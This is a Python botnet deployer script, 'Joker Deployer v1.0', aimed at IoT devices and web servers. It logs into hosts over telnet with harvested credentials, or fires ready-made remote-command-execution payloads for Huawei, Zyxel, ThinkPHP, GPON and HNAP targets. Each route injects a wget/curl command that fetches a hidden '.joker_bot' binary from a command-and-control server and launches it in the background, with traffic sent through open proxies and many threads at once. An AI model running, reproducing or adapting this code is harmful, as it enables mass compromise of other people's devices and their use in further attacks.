#!/usr/bin/env python3
import socket
import random
import threading
import time
import os
import sys
import struct
import json
import urllib.parse

C2_HOST = "0.0.0.0"
C2_PORT = 9001
RESULTS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scan_results.txt")
DEPLOYED_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deployed.txt")

_config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "src", "config.json")
try:
    with open(_config_path, "r") as f:
        _cfg = json.load(f)
    C2_HOST = _cfg.get("public_host", C2_HOST)
    C2_PORT = int(_cfg.get("public_port", C2_PORT))
except Exception:
    pass

ARCH_BINARIES = {
    "mips": "/tmp/.mips_agent",
    "mipsel": "/tmp/.mipsel_agent",
    "arm": "/tmp/.arm_agent",
    "armv7l": "/tmp/.armv7l_agent",
    "x86": "/tmp/.x86_agent",
    "x86_64": "/tmp/.x64_agent",
    "sh4": "/tmp/.sh4_agent",
    "powerpc": "/tmp/.ppc_agent",
}

def loadResults():
    results = []
    if not os.path.exists(RESULTS_FILE):
        return results
    with open(RESULTS_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(":")
            if len(parts) == 4:
                ip, port, user, pw = parts
                results.append({"ip": ip, "port": int(port), "type": "creds", "username": user, "password": pw})
            elif len(parts) == 3:
                ip, port, exp = parts
                results.append({"ip": ip, "port": int(port), "type": "exploit", "exploit": exp, "username": "", "password": ""})
    return results

def loadProxies():
    proxies = []
    paths = [
        os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "..", "core", "free-proxy-list.txt"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "core", "free-proxy-list.txt"),
        "free-proxy-list.txt",
    ]
    for path in paths:
        if os.path.exists(path):
            with open(path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or line.startswith("*"):
                        continue
                    parts = line.split(":")
                    if len(parts) == 2:
                        try:
                            int(parts[1])
                            proxies.append(line)
                        except ValueError:
                            pass
            break
    return proxies

proxies = loadProxies()

def proxyConnect(ip, port, timeout=3):
    if proxies:
        for _ in range(3):
            proxy = random.choice(proxies)
            try:
                parts = proxy.split(":")
                phost, pport = parts[0], int(parts[1])
                if pport in (1080, 4145):
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2.settimeout(timeout)
                    s2.connect((phost, pport))
                    s2.sendall(b"\x05\x01\x00")
                    auth = s2.recv(2)
                    if auth[1] == 0:
                        s2.sendall(b"\x05\x01\x00\x01" + socket.inet_aton(ip) + struct.pack(">H", port))
                        resp = s2.recv(10)
                        if resp[1] == 0:
                            return s2
                    s2.close()
                elif pport in (3128, 8080, 8888):
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2.settimeout(timeout)
                    s2.connect((phost, pport))
                    s2.sendall(f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n".encode())
                    resp = s2.recv(512)
                    if b"200" in resp:
                        return s2
                    s2.close()
                else:
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2.settimeout(timeout)
                    s2.connect((phost, pport))
                    s2.sendall(b"\x05\x01\x00")
                    auth = s2.recv(2)
                    if auth[1] == 0:
                        s2.sendall(b"\x05\x01\x00\x01" + socket.inet_aton(ip) + struct.pack(">H", port))
                        resp = s2.recv(10)
                        if resp[1] == 0:
                            return s2
                    try:
                        s2.sendall(f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n".encode())
                        resp = s2.recv(512)
                        if b"200" in resp:
                            return s2
                    except:
                        pass
                    s2.close()
            except:
                pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        return s
    except:
        return None

def consumeIACs(sock):
    try:
        data = sock.recv(256)
    except:
        return "", False
    result = bytearray()
    i = 0
    while i < len(data):
        if data[i] == 0xff and i + 1 < len(data):
            cmd = data[i+1]
            if cmd in (0xfb, 0xfc, 0xfd, 0xfe):
                i += 3 if i + 2 < len(data) else 2
                continue
            if cmd == 0xff:
                i += 2
                continue
        result.append(data[i])
        i += 1
    return result.decode('utf-8', errors='ignore'), True

def isLoginPrompt(text):
    tl = text.lower()
    return any(x in tl for x in ["login:", "username:", "user:", "ogin:"])

ARCH_MAP = {
    "mips": "mips",
    "mipsel": "mipsle",
    "arm": "arm",
    "armv7l": "armv7l",
    "arm64": "arm64",
    "x86": "x86",
    "x86_64": "x86_64",
    "amd64": "x86_64",
    "386": "x86",
    "sh4": "sh4",
    "powerpc": "powerpc",
}

def deployAgent(sock, arch, target_c2_host, target_c2_port):
    remote_path = "/tmp/.joker_bot"
    arch_url = ARCH_MAP.get(arch, "mipsle")
    cmd = f"cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /; wget -q http://{target_c2_host}:{target_c2_port}/agent/{arch_url} -O .joker_bot 2>/dev/null || curl -s http://{target_c2_host}:{target_c2_port}/agent/{arch_url} -o .joker_bot 2>/dev/null; chmod 777 .joker_bot; nohup ./.joker_bot {target_c2_host} {target_c2_port} --install --cascade >/dev/null 2>&1 &\r\n"
    sock.sendall(cmd.encode())
    time.sleep(2)

def deployAgentTelnet(target, target_c2_host, target_c2_port):
    ip = target["ip"]
    port = target["port"]
    username = target["username"]
    password = target["password"]
    sock = proxyConnect(ip, port, 3)
    if not sock:
        return False
    try:
        banner, ok = consumeIACs(sock)
    except:
        pass
    banner, ok = consumeIACs(sock)
    if not ok or (banner and not isLoginPrompt(banner)):
        try:
            sock.sendall(b"\r\n")
            time.sleep(0.3)
            banner, _ = consumeIACs(sock)
        except:
            pass
    if not banner or not isLoginPrompt(banner):
        sock.close()
        return False
    try:
        sock.sendall((username + "\r\n").encode())
        time.sleep(0.2)
        sock.sendall((password + "\r\n").encode())
        time.sleep(0.5)
        resp, ok = consumeIACs(sock)
        if not ok:
            sock.close()
            return False
        tl = resp.lower()
        if any(x in tl for x in ["incorrect", "failed", "denied", "invalid", "wrong", "bad"]):
            sock.close()
            return False
        for cmd in ["enable\r\n", "system\r\n", "shell\r\n", "sh\r\n"]:
            try:
                sock.sendall(cmd.encode())
                time.sleep(0.3)
                sock.settimeout(1)
                consumeIACs(sock)
            except:
                pass
        arch = fingerprint(sock)
        print(f"[+] {ip}:{port} - {username}:{password} - arch: {arch}")
        deployAgent(sock, arch, target_c2_host, target_c2_port)
        sock.close()
        with open(DEPLOYED_FILE, "a") as f:
            f.write(f"{ip}:{port}:{username}:{password}\n")
        return True
    except:
        try: sock.close()
        except: pass
        return False

def deployAgentExploit(target, target_c2_host, target_c2_port):
    ip = target["ip"]
    port = target["port"]
    exp = target["exploit"]
    
    # Build exploit payload with direct wget + agent deploy commands
    if exp == "huawei":
        shell_cmd = f"cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /; wget http://{target_c2_host}:{target_c2_port}/agent/mipsle -O .joker_bot 2>/dev/null || curl -s http://{target_c2_host}:{target_c2_port}/agent/mipsle -o .joker_bot 2>/dev/null; chmod 777 .joker_bot; nohup ./.joker_bot {target_c2_host} {target_c2_port} --install --cascade >/dev/null 2>&1 &"
        payload = f"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: {ip}\r\nContent-Length: 500\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$({shell_cmd})</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n"
    elif exp == "zyxel":
        shell_cmd = f"cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /; wget http://{target_c2_host}:{target_c2_port}/agent/mipsle -O .joker_bot 2>/dev/null || curl -s http://{target_c2_host}:{target_c2_port}/agent/mipsle -o .joker_bot 2>/dev/null; chmod 777 .joker_bot; nohup ./.joker_bot {target_c2_host} {target_c2_port} --install --cascade >/dev/null 2>&1 &"
        payload = f"POST /cgi-bin/ViewLog.asc HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\nUser-Agent: python-requests\r\nContent-Length: 250\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{shell_cmd}"
    elif exp == "thinkphp":
        shell_cmd = f"cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /; wget http://{target_c2_host}:{target_c2_port}/agent/mipsle -O /tmp/.joker_bot 2>/dev/null || curl -s http://{target_c2_host}:{target_c2_port}/agent/mipsle -o /tmp/.joker_bot 2>/dev/null; chmod 777 /tmp/.joker_bot; nohup /tmp/.joker_bot {target_c2_host} {target_c2_port} --install --cascade >/dev/null 2>&1 &"
        encoded_cmd = urllib.parse.quote_plus(shell_cmd)
        payload = f"GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]={encoded_cmd} HTTP/1.1\r\nConnection: keep-alive\r\nUser-Agent: Uirusu/2.0\r\n\r\n"
    elif exp == "gpon80":
        shell_cmd = f"cd+/tmp%3Bwget+http://{target_c2_host}:{target_c2_port}/agent/mipsle+-O+/tmp/.joker_bot%3Bchmod+777+/tmp/.joker_bot%3B/tmp/.joker_bot+{target_c2_host}+{target_c2_port}+--install+--cascade+%3E/dev/null+2%3E%261+%26%22%29+--%3E"
        payload = f"GET /GponForm/diag_Form?script/%3C%25+echo+shell_exec%28%22{shell_cmd}%22%29+--%3E HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    elif exp == "hnap":
        shell_cmd = f"cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /; wget http://{target_c2_host}:{target_c2_port}/agent/mipsle -O .joker_bot 2>/dev/null || curl -s http://{target_c2_host}:{target_c2_port}/agent/mipsle -o .joker_bot 2>/dev/null; chmod 777 .joker_bot; nohup ./.joker_bot {target_c2_host} {target_c2_port} --install --cascade >/dev/null 2>&1 &"
        payload = f"POST /HNAP1 HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/xml; charset=utf-8\r\nContent-Length: 700\r\nSOAPAction: \"http://hapextern/SetupWANIPConnection\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:AddAnyPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:2\"><NewStatusURL>$({shell_cmd})</NewStatusURL><NewExternalPort>1</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>1</NewInternalPort><NewInternalClient>0.0.0.0</NewInternalClient></u:AddAnyPortMapping></s:Body></s:Envelope>\r\n\r\n"
    else:
        return False
    
    sock = proxyConnect(ip, port, 3)
    if not sock:
        return False
    
    try:
        sock.settimeout(5)
        sock.sendall(payload.encode())
        time.sleep(1)
        sock.settimeout(3)
        resp = b""
        try:
            resp = sock.recv(1024)
        except:
            pass
        sock.close()
        
        if resp and len(resp) > 0:
            print(f"[+] Exploit {exp} payload sent to {ip}:{port}")
            with open(DEPLOYED_FILE, "a") as f:
                f.write(f"{ip}:{port}:{exp}\n")
            return True
        return False
    except:
        try: sock.close()
        except: pass
        return False

def fingerprint(sock):
    commands = [
        "cat /proc/cpuinfo 2>/dev/null || uname -m 2>/dev/null\r\n",
        "uname -m 2>/dev/null\r\n",
        "cat /proc/hw 2>/dev/null\r\n",
    ]
    for cmd in commands:
        try:
            sock.sendall(cmd.encode())
            time.sleep(0.3)
            sock.settimeout(3)
            data = b""
            while True:
                try:
                    chunk = sock.recv(1024)
                    if not chunk: break
                    data += chunk
                    if len(data) > 2048: break
                except:
                    break
            text = data.decode('utf-8', errors='ignore').lower()
            if 'mips' in text and 'be' not in text:
                return 'mips'
            if 'mips' in text and 'le' in text:
                return 'mipsel'
            if 'arm' in text:
                if 'armv7' in text: return 'armv7l'
                return 'arm'
            if 'x86' in text or 'i686' in text or 'i386' in text:
                return 'x86'
            if 'x86_64' in text or 'x64' in text:
                return 'x86_64'
            if 'sh4' in text:
                return 'sh4'
            if 'ppc' in text or 'powerpc' in text:
                return 'powerpc'
        except:
            continue
    return 'mips'

def deploy(target, target_c2_host, target_c2_port, thread_id):
    t = time.time()
    success = False
    if target["type"] == "creds":
        success = deployAgentTelnet(target, target_c2_host, target_c2_port)
    elif target["type"] == "exploit":
        success = deployAgentExploit(target, target_c2_host, target_c2_port)
    elapsed = time.time() - t
    status = "OK" if success else "FAIL"
    print(f"[{thread_id}] {target['ip']}:{target['port']} - {status} ({elapsed:.1f}s)")
    return success

def check_c2_reachable(host, port):
    """Check if C2 server is listening on host:port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False

def start_c2_server(host, port):
    """Start the C2 agent server in a background thread."""
    try:
        import sys as _sys
        _project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        _sys.path.insert(0, _project_root)
        from core.iot_agent.server import C2Server
        srv = C2Server(host="0.0.0.0", port=port)
        srv.start()
        return srv
    except Exception as e:
        print(f"[!] Failed to start C2 server: {e}")
        return None

def main():
    global C2_HOST, C2_PORT
    print("=" * 50)
    print("  Joker Deployer v1.0")
    print("=" * 50)
    print()
    c2_input = input(f"C2 address (host:port, default {C2_HOST}:{C2_PORT}): ").strip()
    if c2_input:
        parts = c2_input.split(":")
        if len(parts) == 2:
            C2_HOST = parts[0]
            C2_PORT = int(parts[1])

    # Check if C2 server is reachable; if not, offer to start it
    if not check_c2_reachable(C2_HOST, C2_PORT):
        print(f"[!] C2 server at {C2_HOST}:{C2_PORT} is not reachable.")
        start = input("[?] Start C2 server automatically on 0.0.0.0:{C2_PORT}? (y/n): ").strip().lower()
        if start == 'y':
            print(f"[+] Starting C2 server on 0.0.0.0:{C2_PORT}...")
            srv = start_c2_server("0.0.0.0", C2_PORT)
            if srv:
                threading.Thread(target=lambda: None, daemon=True).start()
                time.sleep(2)
                if check_c2_reachable("127.0.0.1", C2_PORT):
                    print(f"[+] C2 server started on port {C2_PORT}")
                else:
                    print("[!] C2 server failed to start. Continuing anyway...")
            else:
                print("[!] C2 server failed to start. Continuing anyway...")
    else:
        print(f"[+] C2 server at {C2_HOST}:{C2_PORT} is reachable")

    threadInput = input("Threads (default 250): ").strip()
    deploy_threads = int(threadInput) if threadInput else 250
    print()
    print(f"[DEPLOYER] C2: {C2_HOST}:{C2_PORT} | Threads: {deploy_threads}")
    print(f"[DEPLOYER] Results file: {RESULTS_FILE}")
    print(f"[DEPLOYER] Bot download: http://{C2_HOST}:{C2_PORT}/agent/<arch>")
    print()
    results = loadResults()
    print(f"[+] Loaded {len(results)} results from {RESULTS_FILE}")
    if not results:
        print("[!] No results found. Run the scanner first.")
        input("\n[DEPLOYER] Press Enter to exit...")
        return
    print(f"[+] Starting deployment with {deploy_threads} threads...")
    print()

    from queue import Queue

    queue = Queue()
    for r in results:
        queue.put(r)

    total = queue.qsize()
    deployed = [0]
    failed = [0]
    lock = threading.Lock()

    def worker():
        while True:
            try:
                target = queue.get_nowait()
            except:
                return
            tid = threading.current_thread().name
            ok = deploy(target, C2_HOST, C2_PORT, tid)
            with lock:
                if ok:
                    deployed[0] += 1
                else:
                    failed[0] += 1
            queue.task_done()

    threads = []
    for i in range(deploy_threads):
        t = threading.Thread(target=worker, name=f"D{i}")
        t.daemon = True
        t.start()
        threads.append(t)

    queue.join()

    for t in threads:
        t.join(timeout=30)

    print()
    print(f"[DEPLOYER] Done. Attempted: {total} | Deployed: {deployed[0]} | Failed: {failed[0]}")
    input("\n[DEPLOYER] Press Enter to exit...")

if __name__ == "__main__":
    main()
